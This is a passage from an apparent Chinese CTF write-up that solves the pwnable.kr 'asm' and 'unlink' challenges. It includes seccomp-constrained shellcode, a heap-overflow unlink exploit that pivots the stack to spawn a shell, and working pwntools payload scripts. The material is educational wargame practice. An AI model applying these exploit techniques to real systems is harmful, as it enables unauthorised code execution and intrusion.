</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;seccomp.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/prctl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define LENGTH 128
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>sandbox</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=n>scmp_filter_ctx</span> <span class=n>ctx</span> <span class=o>=</span> <span class=nf>seccomp_init</span><span class=p>(</span><span class=n>SCMP_ACT_KILL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>ctx</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;seccomp error</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>seccomp_rule_add</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>SCMP_ACT_ALLOW</span><span class=p>,</span> <span class=nf>SCMP_SYS</span><span class=p>(</span><span class=n>open</span><span class=p>),</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>seccomp_rule_add</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>SCMP_ACT_ALLOW</span><span class=p>,</span> <span class=nf>SCMP_SYS</span><span class=p>(</span><span class=n>read</span><span class=p>),</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>seccomp_rule_add</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>SCMP_ACT_ALLOW</span><span class=p>,</span> <span class=nf>SCMP_SYS</span><span class=p>(</span><span class=n>write</span><span class=p>),</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>seccomp_rule_add</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>SCMP_ACT_ALLOW</span><span class=p>,</span> <span class=nf>SCMP_SYS</span><span class=p>(</span><span class=n>exit</span><span class=p>),</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>seccomp_rule_add</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>SCMP_ACT_ALLOW</span><span class=p>,</span> <span class=nf>SCMP_SYS</span><span class=p>(</span><span class=n>exit_group</span><span class=p>),</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>seccomp_load</span><span class=p>(</span><span class=n>ctx</span><span class=p>)</span> <span class=o>&lt;</span><span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nf>seccomp_release</span><span class=p>(</span><span class=n>ctx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;seccomp error</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>seccomp_release</span><span class=p>(</span><span class=n>ctx</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>stub</span><span class=p>[]</span> <span class=o>=</span><span class=s>&#34;</span><span class=se>\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff</span><span class=s>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>filter</span><span class=p>[</span><span class=mi>256</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>_IONBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>_IOLBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Welcome to shellcoding practice challenge.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Try to make shellcode that spits flag using open()/read()/write() systemcalls only.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;If this does not challenge you. you should play&#39;asg&#39;challenge :)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>sh</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=nf>mmap</span><span class=p>(</span><span class=mh>0x41414000</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=n>MAP_ANONYMOUS</span> <span class=o>|</span> <span class=n>MAP_FIXED</span> <span class=o>|</span> <span class=n>MAP_PRIVATE</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>sh</span><span class=p>,</span> <span class=mh>0x90</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>sh</span><span class=p>,</span> <span class=n>stub</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>stub</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>offset</span> <span class=o>=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>stub</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;give me your x64 shellcode:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>sh</span><span class=o>+</span><span class=n>offset</span><span class=p>,</span> <span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>alarm</span><span class=p>(</span><span class=mi>10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>chroot</span><span class=p>(</span><span class=s>&#34;/home/asm_pwn&#34;</span><span class=p>);</span>    <span class=c1>// you are in chroot jail. so you can&#39;t use symlink in /tmp
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>sandbox</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>((</span><span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=p>)(</span><span class=kt>void</span><span class=p>))</span><span class=n>sh</span><span class=p>)();</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>程序通过 <code>sandbox</code> 函数和 <code>chroot</code> 禁止我们使用符号链接和除了 <code>open, read, write</code> 之外的函数，同时题目给出了一个 <code>readme</code>：</p><pre tabindex=0><code>once you connect to port 9026, the &#34;asm&#34; binary will be executed under asm_pwn privilege.
make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory)
</code></pre><p>flag 的文件名是一个已知的非常长的字符串。</p><p>根据提示，我们知道我们需要写一段 <code>shellcode</code>，并通过最后的 <code>((void (*)(void))sh)();</code> 执行。在执行前，程序还会执行一段汇编代码，也就是这里的 <code>stub</code> 数组中的内容，利用 <code>pwntools</code> 的 <code>disasm</code> 工具得到汇编代码：</p><pre tabindex=0><code>   0:   48                      dec    eax
   1:   31 c0                   xor    eax,eax
   3:   48                      dec    eax
   4:   31 db                   xor    ebx,ebx
   6:   48                      dec    eax
   7:   31 c9                   xor    ecx,ecx
   9:   48                      dec    eax
   a:   31 d2                   xor    edx,edx
   c:   48                      dec    eax
   d:   31 f6                   xor    esi,esi
   f:   48                      dec    eax
  10:   31 ff                   xor    edi,edi
  12:   48                      dec    eax
  13:   31 ed                   xor    ebp,ebp
  15:   4d                      dec    ebp
  16:   31 c0                   xor    eax,eax
  18:   4d                      dec    ebp
  19:   31 c9                   xor    ecx,ecx
  1b:   4d                      dec    ebp
  1c:   31 d2                   xor    edx,edx
  1e:   4d                      dec    ebp
  1f:   31 db                   xor    ebx,ebx
  21:   4d                      dec    ebp
  22:   31 e4                   xor    esp,esp
  24:   4d                      dec    ebp
  25:   31 ed                   xor    ebp,ebp
  27:   4d                      dec    ebp
  28:   31 f6                   xor    esi,esi
  2a:   4d                      dec    ebp
  2b:   31 ff                   xor    edi,edi
</code></pre><p>这里把所有寄存器都清零了，这样实际上更方便我们写 <code>shellcode</code>。</p><p>考虑如何用系统调用读取文件并显示出来：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>filepath</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>100</span><span class=p>);</span> <span class=c1>// stdout
</span></span></span></code></pre></div><p>然后我们利用 <code>pwntools</code> 的 <code>shellcraft</code> 模块，将上面的代码转化成汇编即可。我们要取得 <code>fd</code> 也就是 <code>open</code> 的返回值，显然在 <code>rax</code> 里；然后从 <code>rax</code> 中读取 flag 内容，放到栈上，也就是 <code>rsp</code> 上：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>,</span> <span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;DEBUG&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;pwnable.kr&#39;</span><span class=p>,</span> <span class=mi>9026</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s1>&#39;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=s1>&#39;rax&#39;</span><span class=p>,</span> <span class=s1>&#39;rsp&#39;</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=s1>&#39;rsp&#39;</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;shellcode:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>shellcode</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h2 id=unlink class="relative group">unlink <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#unlink aria-label=锚点>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>typedef</span> <span class=k>struct</span> <span class=n>tagOBJ</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>tagOBJ</span><span class=o>*</span> <span class=n>fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>tagOBJ</span><span class=o>*</span> <span class=n>bk</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=n>OBJ</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>shell</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>unlink</span><span class=p>(</span><span class=n>OBJ</span><span class=o>*</span> <span class=n>P</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=n>OBJ</span><span class=o>*</span> <span class=n>BK</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>OBJ</span><span class=o>*</span> <span class=n>FD</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>BK</span><span class=o>=</span><span class=n>P</span><span class=o>-&gt;</span><span class=n>bk</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>FD</span><span class=o>=</span><span class=n>P</span><span class=o>-&gt;</span><span class=n>fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>FD</span><span class=o>-&gt;</span><span class=n>bk</span><span class=o>=</span><span class=n>BK</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>BK</span><span class=o>-&gt;</span><span class=n>fd</span><span class=o>=</span><span class=n>FD</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc</span><span class=p>(</span><span class=mi>1024</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>OBJ</span><span class=o>*</span> <span class=n>A</span> <span class=o>=</span> <span class=p>(</span><span class=n>OBJ</span><span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>OBJ</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>OBJ</span><span class=o>*</span> <span class=n>B</span> <span class=o>=</span> <span class=p>(</span><span class=n>OBJ</span><span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>OBJ</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>OBJ</span><span class=o>*</span> <span class=n>C</span> <span class=o>=</span> <span class=p>(</span><span class=n>OBJ</span><span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>OBJ</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// double linked list: A &lt;-&gt; B &lt;-&gt; C
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>A</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=n>B</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>B</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>=</span> <span class=n>A</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>B</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=n>C</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>C</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>=</span> <span class=n>B</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;here is stack address leak: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>A</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;here is heap address leak: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>A</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;now that you have leaks, get shell!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// heap overflow!
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>gets</span><span class=p>(</span><span class=n>A</span><span class=o>-&gt;</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// exploit this unlink!
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>unlink</span><span class=p>(</span><span class=n>B</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>题目提供了指针 A 在栈上的地址和其所指对象在堆上的地址，随后出现了一个堆溢出漏洞，显然是要我们溢出 A 的 buf 去覆盖 B 的内容，然后 <code>unlink(B)</code>。</p><p><code>unlink</code> 函数的原理和双向链表中删除结点是一样的，不规范地缩写一下：</p><pre tabindex=0><code>[P-&gt;fd]-&gt;bk = P-&gt;bk
[P-&gt;bk]-&gt;fd = P-&gt;fd
</code></pre><p>然而，尽管 <code>P->fd->bk</code> 和 <code>P->bk->fd</code> 会被检查合法性，这两句赋值语句中的 <code>P->fd</code> 和 <code>P->bk</code> 都不会被检查，换句话说我们可以用这个特性使右边的地址覆盖掉左边地址。</p><blockquote><p>再简单一点，注意到 <code>->fd</code> 等于 <code>+0x0</code>，<code>->bk</code> 等于 <code>+0x4</code>，也就是：</p><pre tabindex=0><code>[P]+0x4 = P+0x4
[P+0x4] = P
</code></pre></blockquote><p>例如，我们可以修改 main 返回地址：<code>ret_addr = shell_addr</code>，也就是令 <code>P->fd=ebp, P->bk=shell_addr</code>（注意到 <code>[P->fd]->bk=ebp+4</code>）。然而，当执行下一句时，有 <code>[P->bk]->fd=*(shell_addr)=shell()</code>，会被 <code>P->fd</code> 也就是 <code>ebp</code> 覆盖掉，导致我们的 <code>shell()</code> 函数被修改。反之同理。</p><p>或者，我们可以往栈上写 <code>shell()</code> 或者 GOT 劫持，由于 <code>NX</code> 保护和库函数缺失，这里也不能用。</p><p>最后，我们先找到了 <code>shell()</code> 地址 <code>0x80484eb</code>，随后在汇编中发现关键代码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=p>[</span><span class=no>ebp-0x4</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>leave</span>
</span></span><span class=line><span class=cl><span class=nf>lea</span> <span class=no>esp</span><span class=p>,</span> <span class=p>[</span><span class=no>ecx-0x4</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>retn</span>
</span></span></code></pre></div><p>这里的代码逻辑很奇怪：<code>leave</code> 已经恢复 <code>esp</code> 了，下一句又改变了 <code>esp</code> 的值。换个写法：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>ecx</span> <span class=o>=</span> <span class=p>[</span><span class=n>ebp</span><span class=o>-</span><span class=mh>0x4</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>esp</span> <span class=o>=</span> <span class=n>ecx</span><span class=o>-</span><span class=mh>0x4</span>
</span></span><span class=line><span class=cl><span class=n>eip</span> <span class=o>=</span> <span class=n>esp</span>
</span></span></code></pre></div><p>这样就很清晰了，我们可以通过影响 <code>esp</code> 来影响返回地址，这就需要我们控制 <code>ecx</code>。控制 <code>ecx</code>，也就是控制 <code>[ebp-0x4]</code>。</p><p>那我们最终肯定是要让 <code>esp = shell_addr</code>，为了产生这个 <code>shell_addr</code>，首先要把 <code>shell()</code> 写入堆上的某个安全（不会被修改）的地方，显然 <code>A->buf</code> 开头是非常理想的位置。</p><p>此时有 <code>shell_addr = A+0x8</code>（两个指针 8 字节），那就要让 <code>esp = ecx-0x4 = A+0x8</code>，得 <code>ecx = A+0xc</code>。</p><p>这需要 <code>[ebp-0x4] = A+0xc</code>，这就到了 <code>unlink</code> 出场的时候了。我们设置 <code>B->bk</code> 为 <code>ebp-0x4</code>，<code>B->fd</code> 为 <code>A+0xc</code>，按照前面说的原理就能实现覆盖（注：此时 <code>A->buf[4:8]</code> 被修改，这不会有影响），此时堆长这样（每块 4 字节）：</p><pre tabindex=0><code> ---------
| A-&gt;fd   |
 ---------
| A-&gt;bk   |
 ---------
| shell() | // A-&gt;buf[0:4]
 ---------
|         | // A-&gt;buf[4:8]
 ---------
| A+0xc   | // B-&gt;fd
 ---------
| ebp-0x4 | // B-&gt;bk
 ---------
| B-&gt;buf  |
  ...
</code></pre><p>问题来了：</p><ol><li>上面的 <code>A</code> 是 A 的栈地址还是 A 所指对象的堆地址？</li><li>如何得到 <code>ebp-0x4</code>？</li></ol><p>第一个问题很容易，我们最终需要获取的内容是 <code>shell()</code>，这个东西被我们放在了 A 所指的 OBJ 对象里，所以我们去拿 <code>A+0x8</code> 很明显是指 A 的堆地址，也就是 <code>heap address leak</code>。</p><p>第二个问题，题目给的 <code>stack_leak</code> 我们似乎还没有用，怎么用呢？因为我们需要用 A 在栈上的地址找到 <code>ebp-0x4</code> 的值，所以计算一下两者的偏移量即可。在汇编代码中可以找到 A,B,C 分别位于 <code>ebp-0x14, ebp-0xc, ebp-0x10</code> 的位置，那就可以推出 <code>ebp-0x4 = (ebp-0x14) + 0x10 = stack address leak + 0x10</code>。</p><p>最终 payload：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>ssh</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;pwnable.kr&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>2222</span><span class=p>,</span> <span class=n>user</span><span class=o>=</span><span class=s1>&#39;unlink&#39;</span><span class=p>,</span> <span class=n>password</span><span class=o>=</span><span class=s1>&#39;guest&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>process</span><span class=p>(</span><span class=s1>&#39;./unlink&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;stack address leak:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>stack_leak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>10</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;heap address leak:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap_leak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>9</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shell_addr</span> <span class=o>=</span> <span class=mh>0x80484eb</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>shell_addr</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>12</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>heap_leak</span><span class=o>+</span><span class=mh>0xc</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>stack_leak</span><span class=o>+</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p>此外，我们刚才仅仅利用了第二句话 <code>[P->bk]->fd = P->fd</code>，另一句话并没有用。那能不能只用另一句话 <code>[P->fd]->bk = P->bk</code> 来完成这题呢？当然是可以的。实际上，区别很微妙。</p><p>这里不同于刚才控制 <code>[ebp-0x4]</code> 修改 <code>ecx</code> 的思路，而是直接想办法修改 <code>ebp</code> 引起 <code>ecx</code> 变化，目标还是让 <code>[ebp-0x4]=A+0xc</code>。</p><p>令 <code>P->fd = ebp-0x8</code>，<code>P->bk = A+0xc</code>，则我们会发现 <code>[P->fd]->bk</code> 指向 <code>ecx</code>，此时我们又能用 <code>A+0xc</code> 覆盖 <code>ecx</code> 了！</p><pre tabindex=0><code> ---------
| ebp-0x8 | // B-&gt;fd
 ---------
| A+0xc   | // B-&gt;bk
 ---------
